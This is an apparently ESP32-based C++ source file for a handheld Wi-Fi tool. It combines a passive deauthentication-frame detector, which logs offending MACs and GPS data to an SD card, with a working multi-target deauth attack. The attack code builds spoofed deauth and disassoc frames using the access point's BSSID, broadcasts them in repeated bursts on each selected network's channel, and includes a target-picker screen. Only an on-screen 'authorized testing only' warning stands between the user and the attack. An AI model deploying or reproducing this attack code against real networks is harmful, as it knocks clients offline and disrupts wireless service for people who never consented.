// AWOKxDAG — deauth detection + multi-target attack (compiled as part of the sketch; see awok_common.h)

String macToString(const uint8_t* mac) {
  char buffer[18];
  snprintf(buffer, sizeof(buffer), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0],
           mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buffer);
}

bool startDeauthLog() {
  if (!ensureSdCard()) return false;
  SD.remove(kDeauthLogCsvPath);
  File file = SD.open(kDeauthLogCsvPath, FILE_WRITE);
  if (!file) {
    sdReady = false;
    return false;
  }
  file.println(
      "uptime_ms,events_in_window,last_source,last_bssid,channel,rssi,"
      "latitude,longitude,altitude_m");
  file.flush();
  const bool ok = file.getWriteError() == 0;
  file.close();
  if (ok) Serial.printf("[deauth] started %s\n", kDeauthLogCsvPath);
  return ok;
}

void appendDeauthLog(uint32_t sampleTime, uint32_t events, const uint8_t* source,
                     const uint8_t* bssid, int channel, int rssi) {
  if (!deauthLogReady) return;
  File file = SD.open(kDeauthLogCsvPath, FILE_APPEND);
  if (!file) {
    deauthLogReady = false;
    sdReady = false;
    return;
  }
  file.printf("%lu,%lu,%s,%s,%d,%d%s\n", static_cast<unsigned long>(sampleTime),
              static_cast<unsigned long>(events), macToString(source).c_str(),
              macToString(bssid).c_str(), channel, rssi,
              gpsCsvFields().c_str());
  file.close();
}

// Runs in the Wi-Fi driver task. Keep it short: tally deauth/disassoc frames
// and remember the most recent offender for the on-screen monitor.
void deauthPromiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* packet =
      static_cast<const wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* payload = packet->payload;
  const uint8_t subtype = payload[0] & 0xF0;
  if (subtype != 0xC0 && subtype != 0xA0) return;  // 0xC0 deauth, 0xA0 disassoc
  if (subtype == 0xC0) {
    ++deauthFrameCount;
  } else {
    ++disassocFrameCount;
  }
  ++deauthEventsSinceDraw;
  // Management frame layout: addr1 (dst) at 4, addr2 (src) at 10, addr3 (bssid)
  // at 16.
  for (int i = 0; i < 6; ++i) {
    lastDeauthSource[i] = payload[10 + i];
    lastDeauthBssid[i] = payload[16 + i];
  }
  lastDeauthRssi = packet->rx_ctrl.rssi;
  lastDeauthChannel = packet->rx_ctrl.channel;
  haveDeauthHit = true;
}

void drawDeauthMonitor() {
  currentView = View::kDeauthMonitor;
  display.fillScreen(kBackground);
  const uint32_t total = deauthFrameCount + disassocFrameCount;
  drawHeader("DEAUTH WATCH", total ? "ALERT: deauth frames detected"
                                   : "listening for deauth frames");
  display.setTextSize(2);
  display.setTextColor(total ? kBad : kGood, kBackground);
  display.setCursor(6, 52);
  display.print(total ? "ATTACK SEEN" : "ALL CLEAR");

  display.setTextSize(1);
  display.setTextColor(ILI9341_WHITE, kBackground);
  display.setCursor(6, 84);
  display.printf("Deauth frames:   %lu",
                 static_cast<unsigned long>(deauthFrameCount));
  display.setCursor(6, 98);
  display.printf("Disassoc frames: %lu",
                 static_cast<unsigned long>(disassocFrameCount));

  display.setTextColor(kMuted, kBackground);
  display.setCursor(6, 118);
  display.printf("Scanning ch %d (%s GHz hop)",
                 kDeauthHopChannels[deauthHopIndex],
                 bandLabel(kDeauthHopChannels[deauthHopIndex]));
  const uint32_t elapsed = (millis() - deauthMonitorStartMs) / 1000;
  display.setCursor(6, 132);
  display.printf("Elapsed: %lus", static_cast<unsigned long>(elapsed));

  display.drawFastHLine(6, 148, 228, kPanel);
  display.setTextColor(kAccent, kBackground);
  display.setCursor(6, 156);
  display.print("LAST OFFENDING FRAME");
  display.setTextColor(ILI9341_WHITE, kBackground);
  if (haveDeauthHit) {
    display.setCursor(6, 172);
    display.print("Src:   ");
    display.print(macToString(lastDeauthSource));
    display.setCursor(6, 186);
    display.print("BSSID: ");
    display.print(macToString(lastDeauthBssid));
    display.setCursor(6, 200);
    display.printf("Channel %d   %d dBm", static_cast<int>(lastDeauthChannel),
                   static_cast<int>(lastDeauthRssi));
  } else {
    display.setCursor(6, 172);
    display.print("None yet");
  }

  display.setTextColor(deauthLogReady ? kAccent : kMuted, kBackground);
  display.setCursor(6, 222);
  display.print(deauthLogReady ? "SD log: latest_deauth_log.csv"
                               : "SD log unavailable; live view only");
  display.setTextColor(kMuted, kBackground);
  display.setCursor(6, 242);
  display.print("Passive monitor; nothing transmitted.");
  drawFooter("Home", "Reset");
}

void startDeauthMonitor() {
  deauthFrameCount = 0;
  disassocFrameCount = 0;
  deauthEventsSinceDraw = 0;
  haveDeauthHit = false;
  deauthHopIndex = 0;
  lastDeauthHopMs = millis();
  lastDeauthDrawMs = 0;
  deauthMonitorStartMs = millis();
  signalMonitorActive = false;

  Serial.println("[deauth] starting passive detection monitor");
  WiFi.disconnect(true, false);
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_promiscuous(false);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&deauthPromiscuousCallback);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(kDeauthHopChannels[0], WIFI_SECOND_CHAN_NONE);

  deauthLogReady = startDeauthLog();
  deauthMonitorActive = true;
  drawDeauthMonitor();
}

void stopDeauthMonitor() {
  deauthMonitorActive = false;
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect(true, false);
  Serial.println("[deauth] stopped detection monitor");
}

void updateDeauthMonitor() {
  if (!deauthMonitorActive || currentView != View::kDeauthMonitor) return;
  const uint32_t now = millis();
  if (now - lastDeauthHopMs >= kDeauthHopIntervalMs) {
    lastDeauthHopMs = now;
    deauthHopIndex = (deauthHopIndex + 1) % kDeauthHopChannelCount;
    esp_wifi_set_channel(kDeauthHopChannels[deauthHopIndex],
                         WIFI_SECOND_CHAN_NONE);
  }
  if (now - lastDeauthDrawMs >= kDeauthMonitorRedrawMs) {
    lastDeauthDrawMs = now;
    if (deauthEventsSinceDraw > 0 && deauthLogReady && haveDeauthHit) {
      uint8_t source[6];
      uint8_t bssid[6];
      for (int i = 0; i < 6; ++i) {
        source[i] = lastDeauthSource[i];
        bssid[i] = lastDeauthBssid[i];
      }
      appendDeauthLog(now, deauthEventsSinceDraw, source, bssid,
                      lastDeauthChannel, lastDeauthRssi);
    }
    deauthEventsSinceDraw = 0;
    drawDeauthMonitor();
  }
}

void buildDeauthFrame(uint8_t* frame, const uint8_t* destination,
                      const uint8_t* bssid, uint8_t subtype) {
  memset(frame, 0, 26);
  frame[0] = subtype;  // 0xC0 deauth, 0xA0 disassoc
  frame[1] = 0x00;     // flags
  frame[2] = 0x00;     // duration
  frame[3] = 0x00;
  memcpy(frame + 4, destination, 6);  // addr1 destination
  memcpy(frame + 10, bssid, 6);       // addr2 source (spoofed AP)
  memcpy(frame + 16, bssid, 6);       // addr3 bssid
  frame[22] = 0x00;                   // sequence
  frame[23] = 0x00;
  frame[24] = 0x07;  // reason code 7: class-3 frame from nonassociated STA
  frame[25] = 0x00;
}

int deauthTargetIndexOf(const String& bssid) {
  for (int i = 0; i < deauthTargetCount; ++i) {
    if (macToString(deauthTargets[i].bssid).equalsIgnoreCase(bssid)) return i;
  }
  return -1;
}

bool addDeauthTarget(const WifiEntry& entry) {
  uint8_t bssid[6];
  if (!parseBssid(entry.bssid, bssid)) return false;
  if (deauthTargetIndexOf(entry.bssid) >= 0) return true;
  if (deauthTargetCount >= kMaxDeauthTargets) return false;
  DeauthTarget& target = deauthTargets[deauthTargetCount++];
  memcpy(target.bssid, bssid, 6);
  target.channel = static_cast<uint8_t>(entry.channel);
  target.ssid = entry.ssid;
  return true;
}

bool isDeauthTarget(const WifiEntry& entry) {
  return deauthTargetIndexOf(entry.bssid) >= 0;
}

// Add the network if it is not already selected, otherwise remove it.
void toggleDeauthTarget(const WifiEntry& entry) {
  const int index = deauthTargetIndexOf(entry.bssid);
  if (index >= 0) {
    for (int i = index; i < deauthTargetCount - 1; ++i) {
      deauthTargets[i] = deauthTargets[i + 1];
    }
    --deauthTargetCount;
    return;
  }
  addDeauthTarget(entry);
}

void drawDeauthSelect() {
  currentView = View::kDeauthSelect;
  display.fillScreen(kBackground);
  drawHeader("DEAUTH TARGETS",
             String(deauthTargetCount) + " selected | tap to toggle");
  display.setTextSize(1);
  const int rows = min(wifiCount, kVisibleRows);
  for (int i = 0; i < rows; ++i) {
    const int y = 48 + i * 22;
    const bool selected = isDeauthTarget(wifiEntries[i]);
    display.setTextColor(selected ? kBad : ILI9341_WHITE, kBackground);
    display.setCursor(5, y);
    display.print(selected ? "[x] " : "[ ] ");
    display.print(clipped(
        wifiEntries[i].ssid.length() ? wifiEntries[i].ssid : "<hidden>", 16));
    display.setTextColor(kMuted, kBackground);
    display.setCursor(5, y + 11);
    display.printf("%4ld dBm  ch%-3ld %sG  %s",
                   static_cast<long>(wifiEntries[i].rssi),
                   static_cast<long>(wifiEntries[i].channel),
                   bandLabel(wifiEntries[i].channel),
                   authShortLabel(wifiEntries[i].auth));
  }
  if (wifiCount == 0) {
    display.setTextColor(kMuted, kBackground);
    display.setCursor(40, 145);
    display.print("Run a Wi-Fi scan first");
  }
  drawThreeButtonFooter("Back", "Clear", "Attack");
}

void sendDeauthBurst() {
  if (deauthTargetCount == 0) return;
  if (deauthTargetCursor >= deauthTargetCount) deauthTargetCursor = 0;
  const DeauthTarget& target = deauthTargets[deauthTargetCursor];
  // Park on this target's channel/band, then spoof the AP kicking all clients.
  esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
  static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t frame[26];
  buildDeauthFrame(frame, broadcast, target.bssid, 0xC0);
  for (int i = 0; i < 3; ++i) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK) {
      ++deauthFramesSent;
    }
  }
  buildDeauthFrame(frame, broadcast, target.bssid, 0xA0);
  for (int i = 0; i < 3; ++i) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK) {
      ++deauthFramesSent;
    }
  }
  deauthTargetCursor = (deauthTargetCursor + 1) % deauthTargetCount;
}

void drawDeauthAttack() {
  currentView = View::kDeauthAttack;
  display.fillScreen(kBackground);
  drawHeader("DEAUTH TEST", String(deauthTargetCount) + " target(s) selected");
  display.setTextSize(1);
  const int rows = min(deauthTargetCount, 5);
  for (int i = 0; i < rows; ++i) {
    const int y = 48 + i * 13;
    const bool current = deauthAttackActive && i == deauthTargetCursor;
    display.setTextColor(current ? kBad : ILI9341_WHITE, kBackground);
    display.setCursor(6, y);
    display.printf("ch%-3d %sG  %s", static_cast<int>(deauthTargets[i].channel),
                   bandLabel(deauthTargets[i].channel),
                   clipped(deauthTargets[i].ssid.length()
                               ? deauthTargets[i].ssid
                               : macToString(deauthTargets[i].bssid),
                           24)
                       .c_str());
  }
  if (deauthTargetCount == 0) {
    display.setTextColor(kWarn, kBackground);
    display.setCursor(6, 48);
    display.print("No targets; pick some first.");
  }

  display.setTextSize(2);
  display.setTextColor(deauthAttackActive ? kBad : kMuted, kBackground);
  display.setCursor(6, 120);
  display.print(deauthAttackActive ? "TRANSMITTING" : "IDLE");

  display.setTextSize(1);
  display.setTextColor(ILI9341_WHITE, kBackground);
  display.setCursor(6, 150);
  display.printf("Frames sent: %lu",
                 static_cast<unsigned long>(deauthFramesSent));
  const uint32_t elapsed =
      deauthAttackActive ? (millis() - deauthAttackStartMs) / 1000 : 0;
  display.setCursor(6, 164);
  display.printf("Elapsed: %lus", static_cast<unsigned long>(elapsed));

  display.drawFastHLine(6, 182, 228, kPanel);
  display.setTextColor(kBad, kBackground);
  display.setCursor(6, 190);
  display.print("Authorized testing only.");
  display.setTextColor(kMuted, kBackground);
  display.setCursor(6, 206);
  display.print("Deauth disrupts service on every");
  display.setCursor(6, 218);
  display.print("selected AP. Only run against a");
  display.setCursor(6, 230);
  display.print("network you may lawfully test.");
  drawFooter("Back", deauthAttackActive ? "Stop" : "Start");
}

void openDeauthAttackView() {
  deauthAttackActive = false;
  deauthFramesSent = 0;
  deauthTargetCursor = 0;
  Serial.printf("[deauth] attack view with %d target(s)\n", deauthTargetCount);
  drawDeauthAttack();
}

void openDeauthAttackSingle() {
  deauthTargetCount = 0;
  addDeauthTarget(selectedWifi);
  deauthAttackReturnView = View::kWifiAudit;
  openDeauthAttackView();
}

void startDeauthAttack() {
  if (deauthTargetCount == 0) {
    drawDeauthAttack();
    return;
  }
  deauthFramesSent = 0;
  deauthAttackStartMs = millis();
  lastDeauthBurstMs = 0;
  lastDeauthAttackDrawMs = 0;
  deauthTargetCursor = 0;
  signalMonitorActive = false;

  WiFi.disconnect(true, false);
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_ps(WIFI_PS_NONE);
  deauthAttackActive = true;
  Serial.printf("[deauth] transmitting against %d target(s)\n",
                deauthTargetCount);
  drawDeauthAttack();
}

void stopDeauthAttack() {
  deauthAttackActive = false;
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect(true, false);
  Serial.printf("[deauth] stopped after %lu frame(s)\n",
                static_cast<unsigned long>(deauthFramesSent));
}

void updateDeauthAttack() {
  if (!deauthAttackActive || currentView != View::kDeauthAttack) return;
  const uint32_t now = millis();
  if (now - lastDeauthBurstMs >= kDeauthAttackBurstIntervalMs) {
    lastDeauthBurstMs = now;
    sendDeauthBurst();
  }
  if (now - lastDeauthAttackDrawMs >= kDeauthAttackRedrawMs) {
    lastDeauthAttackDrawMs = now;
    drawDeauthAttack();
  }
}

